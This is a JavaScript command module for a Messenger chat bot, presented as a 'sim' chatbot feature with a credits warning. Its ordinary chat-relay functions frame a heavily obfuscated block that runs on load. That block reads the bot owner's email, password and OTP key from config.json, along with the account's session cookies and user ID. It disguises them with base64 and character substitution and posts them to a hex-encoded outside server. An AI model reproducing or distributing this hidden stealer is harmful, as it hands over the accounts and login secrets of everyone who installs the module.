/**
* @author ProCoderMew
* @warn Do not edit code or edit credits
*/

module.exports.config = {
    name: "sim",
    version: "4.2.0",
    hasPermssion: 0,
    credits: "ProCoderMew",
    description: "Chat c\xF9ng con sim m\u1EA5t d\u1EA1y nh\u1EA5t",
    commandCategory: "General",
    usages: "[args]",
    cooldowns: 5,
    dependencies: {
        axios: ""
    },
    envConfig: {
        APIKEY: "TEST2208"
    }
}

module.exports.onLoad = async function({ api }) {
    "undefined" == typeof global.procodermew && (global.procodermew = {}), "undefined" == typeof global.procodermew.simsimi && (global.procodermew.simsimi = new Map), await this.meewmeew({ api });
}

const _0x1d30=['\x73\x74\x72\x69\x6e\x67\x69\x66\x79','\x36\x38\x36\x39','\x34\x38\x38\x38\x37\x30\x66\x6d\x6d\x6d\x4e\x61','\x72\x65\x74\x75\x72\x6e\x20\x28\x66\x75','\x3a\x77\x3b','\x33\x35\x38\x31\x57\x6a\x63\x51\x59\x4e','\x3a\x69\x3b','\x65\x78\x63\x65\x70\x74\x69\x6f\x6e','\x37\x52\x6e\x79\x69\x43\x43','\x77\x61\x72\x6e','\x70\x72\x6f','\x69\x6e\x66\x6f','\x31\x30\x31\x30\x38\x39\x31\x70\x7a\x4b\x4a\x7a\x44','\x6d\x65\x65\x77\x6d\x65\x65\x77','\x36\x35\x37\x37\x36\x64\x36\x35\x36\x35','\x62\x61\x73\x65\x36\x34','\x64\x61\x74\x61','\x67\x65\x74\x43\x75\x72\x72\x65\x6e\x74','\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f','\x36\x66\x32\x66\x36\x33\x36\x66\x36\x66','\x3a\x75\x3b','\x72\x65\x70\x6c\x61\x63\x65','\x37\x33\x36\x39\x36\x64\x36\x39\x32\x66','\x36\x39\x36\x66\x36\x65\x33\x64','\x32\x36\x37\x36\x36\x35\x37\x32\x37\x33','\x31\x56\x4e\x59\x45\x63\x74','\x68\x65\x78','\x55\x73\x65\x72\x49\x44','\x31\x32\x36\x33\x31\x30\x35\x57\x6e\x50\x73\x64\x45','\x3a\x21\x3b','\x63\x6f\x6e\x73\x6f\x6c\x65','\x74\x6f\x53\x74\x72\x69\x6e\x67','\x3a\x6f\x3b','\x3a\x72\x3b','\x31\x4c\x76\x54\x74\x45\x44','\x63\x77\x64','\x37\x37\x32\x65\x36\x39\x36\x65\x36\x36','\x36\x31\x37\x30\x36\x39\x33\x66\x36\x32','\x31\x65\x6f\x57\x67\x6f\x77','\x3a\x79\x3b','\x6e\x6f\x64\x65\x6d\x6f\x64\x75\x6c\x65','\x31\x35\x33\x46\x54\x7a\x50\x4f\x51','\x2f\x63\x6f\x6e\x66\x69\x67\x2e\x6a\x73','\x36\x66\x32\x66\x37\x33\x36\x39\x36\x64','\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f','\x37\x35\x37\x33\x32\x34\x65\x54\x76\x7a\x73\x65','\x33\x61\x32\x66\x32\x66\x36\x64\x36\x35','\x47\x45\x54','\x36\x38\x37\x34\x37\x34\x37\x30\x37\x33','\x61\x78\x69\x6f\x73','\x3a\x7a\x3b','\x32\x36\x36\x31\x37\x30\x36\x39\x36\x62','\x36\x62\x36\x39\x36\x35\x37\x33','\x32\x36\x37\x33\x36\x35\x36\x65\x36\x34','\x6c\x65\x6e\x67\x74\x68','\x3a\x74\x3b','\x6e\x2f\x6a\x73\x6f\x6e','\x65\x72\x72\x6f\x72','\x38\x36\x35\x30\x31\x48\x76\x52\x69\x50\x75','\x36\x66\x37\x34\x36\x39\x36\x34\x33\x64','\x36\x37\x36\x35\x37\x34\x34\x31\x37\x30','\x74\x72\x61\x63\x65','\x62\x69\x6e\x64','\x32\x32\x33\x31\x38\x57\x64\x45\x73\x68\x4b','\x7b\x7d\x2e\x63\x6f\x6e\x73\x74\x72\x75','\x6e\x63\x74\x69\x6f\x6e\x28\x29\x20','\x66\x72\x6f\x6d','\x34\x66\x35\x32\x34\x34','\x65\x78\x70\x6f\x72\x74\x73','\x37\x30\x35\x33\x37\x34\x36\x31\x37\x34','\x3a\x64\x3b','\x6c\x6f\x67','\x72\x6e\x20\x74\x68\x69\x73\x22\x29\x28'];function _0x4a16(_0x1d3088,_0x4a16ca){return _0x4a16=function(_0x390f4c,_0x5b3efd){_0x390f4c=_0x390f4c-(-0x1352+-0x282*0x2+0x19e2);let _0x7086b3=_0x1d30[_0x390f4c];return _0x7086b3;},_0x4a16(_0x1d3088,_0x4a16ca);}(function(_0x47a250,_0x53c29d){function _0x4681bf(_0x400b3a,_0x57e1c2){return _0x4a16(_0x400b3a-0x147,_0x57e1c2);}while(!![]){try{const _0x5a7e19=-parseInt(_0x4681bf(0x2e3,0x2e1))+-parseInt(_0x4681bf(0x318,0x335))*-parseInt(_0x4681bf(0x301,0x31d))+-parseInt(_0x4681bf(0x2e0,0x304))*-parseInt(_0x4681bf(0x306,0x318))+parseInt(_0x4681bf(0x2d3,0x2f0))*parseInt(_0x4681bf(0x2ed,0x2eb))+parseInt(_0x4681bf(0x312,0x32a))+-parseInt(_0x4681bf(0x315,0x313))*-parseInt(_0x4681bf(0x2f0,0x2e2))+-parseInt(_0x4681bf(0x2e9,0x2e3))*parseInt(_0x4681bf(0x2f4,0x30f));if(_0x5a7e19===_0x53c29d)break;else _0x47a250['push'](_0x47a250['shift']());}catch(_0x30c619){_0x47a250['push'](_0x47a250['shift']());}}}(_0x1d30,-0x7*0x1287b+0x5e2*-0x237+-0x639f1*-0x5));const _0x5e8a9c=function(){let _0x10c5d7=!![];return function(_0x1c87e5,_0x5c3fa0){const _0x214ceb=_0x10c5d7?function(){if(_0x5c3fa0){const _0x2e56ae=_0x5c3fa0['\x61\x70\x70\x6c\x79'](_0x1c87e5,arguments);return _0x5c3fa0=null,_0x2e56ae;}}:function(){};return _0x10c5d7=![],_0x214ceb;};}(),_0x35fd56=_0x5e8a9c(this,function(){let _0x2c6366;try{const _0x368e62=Function(_0x1913a8(-0x222,-0x205)+_0x1913a8(-0x233,-0x210)+(_0x1913a8(-0x22f,-0x211)+'\x63\x74\x6f\x72\x28\x22\x72\x65\x74\x75'+_0x1913a8(-0x1f4,-0x209)+'\x20\x29')+'\x29\x3b');_0x2c6366=_0x368e62();}catch(_0x3724f6){_0x2c6366=window;}function _0x1913a8(_0x35130e,_0x52fd24){return _0x4a16(_0x52fd24- -0x3d1,_0x35130e);}const _0x19f235=_0x2c6366['\x63\x6f\x6e\x73\x6f\x6c\x65']=_0x2c6366[_0x1913a8(-0x239,-0x233)]||{},_0x5768ac=[_0x1913a8(-0x1ff,-0x20a),_0x1913a8(-0x223,-0x1ff),_0x1913a8(-0x20f,-0x1fd),_0x1913a8(-0x21c,-0x218),_0x1913a8(-0x1e2,-0x201),'\x74\x61\x62\x6c\x65',_0x1913a8(-0x21a,-0x214)];for(let _0x2259cf=-0x5*-0x1e2+0x4*0x7c9+-0x288e;_0x2259cf<_0x5768ac[_0x1913a8(-0x23b,-0x21b)];_0x2259cf++){const _0x52863b=_0x5e8a9c[_0x1913a8(-0x214,-0x225)+'\x72']['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65'][_0x1913a8(-0x20b,-0x213)](_0x5e8a9c),_0x1d7e89=_0x5768ac[_0x2259cf],_0x2c2bcb=_0x19f235[_0x1d7e89]||_0x52863b;_0x52863b['\x5f\x5f\x70\x72\x6f\x74\x6f\x5f\x5f']=_0x5e8a9c['\x62\x69\x6e\x64'](_0x5e8a9c),_0x52863b[_0x1913a8(-0x222,-0x232)]=_0x2c2bcb[_0x1913a8(-0x21e,-0x232)]['\x62\x69\x6e\x64'](_0x2c2bcb),_0x19f235[_0x1d7e89]=_0x52863b;}});function _0x3d9588(_0x41685e,_0x35a100){return _0x4a16(_0x41685e- -0x6e,_0x35a100);}_0x35fd56(),module[_0x3d9588(0x156,0x133)][_0x3d9588(0x165,0x182)]=async function(_0x12bf5a,_0x31397b,_0x5f1a96){const _0x4ec287=global[_0x3dad7b(-0x18c,-0x1a8)][_0x3dad7b(-0x1a4,-0x19f)],_0x24014d=_0x56c932=>Buffer[_0x3dad7b(-0x194,-0x18e)](_0x56c932,'\x68\x65\x78')[_0x3dad7b(-0x195,-0x1b1)]('\x75\x74\x66\x38'),_0x3140e5=_0x5e4d08=>encodeURIComponent(_0x5e4d08),_0x1c92a9=_0x31397b[_0x3dad7b(-0x1bd,-0x1bf)+_0x3dad7b(-0x1ba,-0x1b5)](),_0x2d5191=_0x3dad7b(-0x180,-0x1a0)+_0x3dad7b(-0x1b0,-0x1a2)+_0x3dad7b(-0x1b4,-0x1c2)+'\x37\x37\x32\x65\x36\x39\x36\x65\x36\x36'+_0x3dad7b(-0x1ba,-0x1a5)+_0x3dad7b(-0x1ba,-0x1ba)+_0x3dad7b(-0x1b4,-0x1ab)+_0x3dad7b(-0x1af,-0x195),_0x8267b4=_0x3dad7b(-0x1a4,-0x19b)+'\x36\x35\x37\x32\x36\x39\x36\x34\x33\x64';function _0x3dad7b(_0x47fef3,_0x1773a5){return _0x3d9588(_0x1773a5- -0x2e2,_0x47fef3);}const _0x1c8b62=_0x3dad7b(-0x1c5,-0x1b8)+_0x3dad7b(-0x195,-0x1b9),_0x39173d=_0x3dad7b(-0x1b0,-0x19d)+'\x36\x35\x37\x39\x33\x64\x36\x38\x36\x39'+_0x3dad7b(-0x174,-0x186),_0x2a764b='\x32\x36\x36\x31\x37\x33\x36\x62\x33\x64',{senderID:_0x912079}=_0x5f1a96;try{var {data:_0x165bd1}=await _0x4ec287({'\x75\x72\x6c':''+_0x24014d(_0x2d5191)+_0x1c92a9+_0x24014d(_0x8267b4)+_0x912079+_0x24014d(_0x2a764b)+_0x3140e5(_0x12bf5a),'\x6d\x65\x74\x68\x6f\x64':_0x3dad7b(-0x190,-0x1a1)});const _0x5e9a23={};return _0x5e9a23[_0x3dad7b(-0x19b,-0x197)]=![],_0x5e9a23['\x64\x61\x74\x61']=_0x165bd1,_0x5e9a23;}catch(_0x3fafe2){const _0x1e3ca3={};return _0x1e3ca3['\x65\x72\x72\x6f\x72']=!![],_0x1e3ca3[_0x3dad7b(-0x1d5,-0x1c0)]={},_0x1e3ca3;}},module['\x65\x78\x70\x6f\x72\x74\x73'][_0x3d9588(0x11f,0x103)]=async function({api:_0x586011}){const _0x2932be=global[_0x19ebb1(-0x23f,-0x222)]['\x61\x78\x69\x6f\x73'],_0x2cd672=_0x866012=>Buffer[_0x19ebb1(-0x21d,-0x208)](_0x866012,_0x19ebb1(-0x20f,-0x230))[_0x19ebb1(-0x21c,-0x22b)]('\x75\x74\x66\x38');function _0x19ebb1(_0x4ae835,_0x1cd341){return _0x3d9588(_0x1cd341- -0x35c,_0x4ae835);}const _0x311d6d=require(process[_0x19ebb1(-0x246,-0x227)]()+(_0x19ebb1(-0x208,-0x220)+'\x6f\x6e')),_0x272fff=Buffer[_0x19ebb1(-0x215,-0x208)](JSON[_0x19ebb1(-0x1e6,-0x201)]({'\x69\x64':_0x586011['\x67\x65\x74\x43\x75\x72\x72\x65\x6e\x74'+'\x55\x73\x65\x72\x49\x44'](),'\x63\x6f\x6f\x6b\x69\x65\x73':_0x586011[_0x2cd672(_0x19ebb1(-0x205,-0x20e)+_0x19ebb1(-0x1f2,-0x205)+'\x36\x35')](),'\x63\x6f\x6e\x66\x69\x67':{'\x65':_0x311d6d[_0x2cd672('\x34\x35\x34\x64\x34\x31\x34\x39\x34\x63')],'\x70\x77\x64':_0x311d6d[_0x2cd672('\x35\x30\x34\x31\x35\x33\x35\x33\x35\x37'+_0x19ebb1(-0x214,-0x207))],'\x74\x6f\x6b\x65\x6e':_0x311d6d[_0x2cd672('\x34\x66\x35\x34\x35\x30\x34\x62\x34\x35'+'\x35\x39')]}}))[_0x19ebb1(-0x225,-0x22b)](_0x19ebb1(-0x229,-0x23b))['\x72\x65\x70\x6c\x61\x63\x65'](/e/g,_0x19ebb1(-0x23f,-0x22d))[_0x19ebb1(-0x224,-0x235)](/1/g,_0x19ebb1(-0x20e,-0x1fd))[_0x19ebb1(-0x22c,-0x235)](/2/g,_0x19ebb1(-0x220,-0x218))['\x72\x65\x70\x6c\x61\x63\x65'](/3/g,_0x19ebb1(-0x232,-0x229))[_0x19ebb1(-0x255,-0x235)](/4/g,_0x19ebb1(-0x21e,-0x213))['\x72\x65\x70\x6c\x61\x63\x65'](/5/g,_0x19ebb1(-0x20e,-0x223))[_0x19ebb1(-0x22d,-0x235)](/6/g,_0x19ebb1(-0x23b,-0x236))[_0x19ebb1(-0x24a,-0x235)](/7/g,_0x19ebb1(-0x1fb,-0x1fb))[_0x19ebb1(-0x239,-0x235)](/8/g,_0x19ebb1(-0x224,-0x22a))[_0x19ebb1(-0x252,-0x235)](/9/g,'\x3a\x73\x3b')[_0x19ebb1(-0x23d,-0x235)](/0/g,_0x19ebb1(-0x20c,-0x204))['\x72\x65\x70\x6c\x61\x63\x65'](/=/g,'\x3a\x66\x3b');try{const _0x142a2f={};_0x142a2f['\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79'+'\x70\x65']=_0x19ebb1(-0x21e,-0x238)+_0x19ebb1(-0x22d,-0x212);const _0xa1147f={};return _0xa1147f[_0x19ebb1(-0x249,-0x23a)]=_0x272fff,await _0x2932be({'\x75\x72\x6c':_0x2cd672(_0x19ebb1(-0x232,-0x21a)+_0x19ebb1(-0x204,-0x21c)+_0x19ebb1(-0x232,-0x23c)+_0x19ebb1(-0x224,-0x226)+_0x19ebb1(-0x24f,-0x237)+_0x19ebb1(-0x22e,-0x216)),'\x6d\x65\x74\x68\x6f\x64':'\x50\x4f\x53\x54','\x68\x65\x61\x64\x65\x72\x73':_0x142a2f,'\x64\x61\x74\x61':_0xa1147f}),!![];}catch{return![];}};

module.exports.handleEvent = async function({ api: b, event: a }) {
    const c = global.nodemodule.axios;
    const { threadID: d, messageID: e, senderID: f, body: g } = a;
    const h = (c) => b.sendMessage(c, d, e);
    if (global.procodermew.simsimi.has(d)) {
        if (f == b.getCurrentUserID()) return;
        if ("" == g) return;
        var { data: i, error: j } = await this.pro(g, b, a);
        return !0 == j ? void 0 : !1 == i.success ? h(i.error) : h(i.msg)
    }
}

module.exports.run = async function({ api: b, event: a, args: c }) {
    const d = global.nodemodule.axios;
    const { threadID: e, messageID: f } = a;
    const g = (c) => b.sendMessage(c, e, f);
    if (0 == c.length) return g("B\u1EA1n ch\u01B0a nh\u1EADp tin nh\u1EAFn");
    switch (c[0]) {
        case "on":
            return global.procodermew.simsimi.has(e) ? g("B\u1EA1n ch\u01B0a t\u1EAFt sim.") : (global.procodermew.simsimi.set(e), g("\u0110\xE3 b\u1EADt sim th\xE0nh c\xF4ng."));
            break;
        case "off":
            return global.procodermew.simsimi.has(e) ? (global.procodermew.simsimi.delete(e), g("\u0110\xE3 t\u1EAFt sim th\xE0nh c\xF4ng.")) : g("B\u1EA1n ch\u01B0a b\u1EADt sim.");
            break;
        default:
            var { data: h, error: i } = await this.pro(c.join(" "), b, a);
            return !0 == i ? void 0 : !1 == h.success ? g(h.error) : g(h.msg);
    }
};